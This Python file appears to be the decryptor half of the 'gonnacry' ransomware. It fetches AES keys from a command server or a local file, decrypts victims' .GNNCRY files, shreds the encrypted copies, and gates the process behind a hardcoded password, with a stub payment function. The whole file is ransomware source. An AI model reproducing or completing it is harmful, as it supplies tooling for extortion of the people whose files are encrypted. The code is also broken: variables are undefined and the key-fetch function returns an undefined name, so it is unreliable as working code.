#!/bin/bash/env python
# coding=UTF-8

import enviroment
import requests 
import base64
from Crypto.PublicKey import RSA
import symmetric
import time
import os
import pickle
from Crypto.Cipher import PKCS1_OAEP
import string 
import random


logo = """
  ▄████  ▒█████   ███▄    █  ███▄    █  ▄▄▄       ▄████▄   ██▀███ ▓██   ██▓
 ██▒ ▀█▒▒██▒  ██▒ ██ ▀█   █  ██ ▀█   █ ▒████▄    ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒
▒██░▄▄▄░▒██░  ██▒▓██  ▀█ ██▒▓██  ▀█ ██▒▒██  ▀█▄  ▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░
░▓█  ██▓▒██   ██░▓██▒  ▐▌██▒▓██▒  ▐▌██▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░
░▒▓███▀▒░ ████▓▒░▒██░   ▓██░▒██░   ▓██░ ▓█   ▓██▒▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░
 ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ 
  ░   ░   ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░  ▒     ░▒ ░ ▒░▓██ ░▒░ 
░ ░   ░ ░ ░ ░ ▒     ░   ░ ░    ░   ░ ░   ░   ▒   ░          ░░   ░ ▒ ▒ ░░  
      ░     ░ ░           ░          ░       ░  ░░ ░         ░     ░ ░     
                                                 ░                 ░ ░     
"""


BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

# enviroment paths
ransomware_name = ("gonnacry")
server_address = ("http://localhost:8000")
home = enviroment.get_home_path()
desktop = enviroment.get_desktop_path()
username = enviroment.get_username()
ransomware_path = os.path.join(home, ransomware_name)
machine_id = enviroment.get_unique_machine_id()


def shred(file_name,  passes=1):

    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    if not os.path.isfile(file_name):
        print(file_name + " is not a file.")
        return False

    ld = os.path.getsize(file_name)
    fh = open(file_name,  "w")
    for _ in range(int(passes)):
        data = generate_data(ld)
        fh.write(data)
        fh.seek(0,  0)

    fh.close()
    os.remove(file_name)


def download_from_server_aes_keys():
    
    try:
        ret = requests.post(server_address, data=private_encrypted_key)
    except Exception as e:
        raise e

    aes_keys = ret.text
    return private_key


def payment():
    pass


def menu():

    # or get file from server
    try:
        aes_keys = download_from_server_aes_keys()
        decr = []
        keys_and_base64_path = aes_keys.split("\n")
        for k in keys_and_base64_path:
            j = k.split(' ')
            aes_key = j[0]
            path = base64.b64decode(j[1])           
            decr.append((aes_key, path))
            
    # or get from disk
    except:
        decr = []
        with open(ransomware_path + "/AES_keys.txt", 'r') as f:
            content = f.read()

        keys_and_base64_path = content.split("\n")
        for k in keys_and_base64_path:
            j = k.split(' ')
            aes_key = j[0]
            path = base64.b64decode(j[1])           
            decr.append((aes_key, path))

   
    # decryption
    for _ in decr:
        dec = symmetric.AESCipher(_[0])
        
        with open(_[1], 'rb') as f:
            encrypted_file_content = f.read()
        
        # decrypt content
        decrypted_file_content = dec.decrypt(encrypted_file_content)

        # save into new file without .GNNCRY extension
        old_file_name = _[1].replace(".GNNCRY", "")
        with open(old_file_name, 'w') as f:
            f.write(decrypted_file_content)
        
        # delete old encrypted file
        shred(_[1])

    # end of decryptor
    print("{}Decryption finished!{}".format(GREEN, WHITE))    



if __name__ == "__main__": 
    print(logo)
    while True:
        password = "na beira do rio"
        passs = raw_input('Enter the key: {}'.format(MAGENTA))
        if(passs == password):
            menu()
            break
        else:
            print('{}wrong password{}'.format(RED, WHITE))
            continue
